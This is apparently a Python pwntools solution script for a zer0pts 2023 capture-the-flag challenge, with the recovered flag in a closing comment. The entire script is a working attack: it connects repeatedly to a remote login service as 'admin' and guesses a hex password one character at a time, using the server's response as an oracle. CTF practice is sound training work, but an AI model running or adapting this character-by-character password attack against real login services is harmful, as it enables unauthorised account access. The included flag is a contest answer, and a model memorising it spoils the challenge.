import string
from pwn import *

password = b""

for _ in range(16):
    for guess in string.hexdigits:
        print(password + guess.encode())
        r = remote('misc.2023.zer0pts.com', 10021)
        r.recvuntil(b'Username: ')
        r.sendline(b'admin')
        r.recvuntil(b'Password: ')
        r.send(password + guess.encode())
        result = r.recvline(timeout=1)
        r.close()
        if b"Incorrect" not in result:
            password += guess.encode()
            print(password)
            break

# flag: zer0pts{d0Nt_r3sp0nd_t00_qu1ck}
